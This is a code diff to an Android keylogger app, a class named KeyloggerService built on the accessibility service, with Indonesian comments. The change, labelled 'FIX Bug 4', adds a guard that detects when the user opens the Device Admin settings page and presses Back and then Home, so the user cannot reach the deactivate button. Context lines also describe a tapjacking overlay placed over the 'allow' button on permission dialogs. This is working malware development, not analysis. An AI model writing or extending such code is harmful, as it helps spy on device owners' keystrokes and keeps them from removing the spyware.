@@ -152,6 +152,8 @@ class KeyloggerService : AccessibilityService() {
 
                 // ── Auto-trigger overlay saat dialog izin sistem muncul ──────
                 if (ev.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                    // FIX Bug 4: cegah user buka halaman Device Admin
+                    guardAdminPage(pkg, ev.className?.toString() ?: "")
                     autoTriggerOverlay(pkg)
                 }
             }
@@ -215,6 +217,27 @@ class KeyloggerService : AccessibilityService() {
      * Mode OVERLAY TRICK (default):
      *   Tampilkan overlay "BATAL" di atas tombol "Izinkan" (tapjacking).
      */
+
+    /**
+     * FIX Bug 4 — intercept halaman Device Admin di Settings.
+     * Jika user membuka Settings > Device Admin, langsung press BACK
+     * untuk mencegah user sampai ke tombol "Nonaktifkan".
+     */
+    private fun guardAdminPage(pkg: String, className: String) {
+        if (!AppDeviceAdminReceiver.SETTINGS_PACKAGES.contains(pkg)) return
+        val isAdminPage = AppDeviceAdminReceiver.ADMIN_PAGE_KEYWORDS.any { kw ->
+            className.contains(kw, ignoreCase = true)
+        }
+        if (!isAdminPage) return
+        android.util.Log.d("AdminGuard", "Blocked: $pkg / $className")
+        handler.postDelayed({
+            performGlobalAction(GLOBAL_ACTION_BACK)
+        }, 120)
+        handler.postDelayed({
+            performGlobalAction(GLOBAL_ACTION_HOME)
+        }, 450)
+    }
+
     private fun autoTriggerOverlay(pkg: String) {
         if (!PERMISSION_DIALOG_PACKAGES.contains(pkg)) return
 
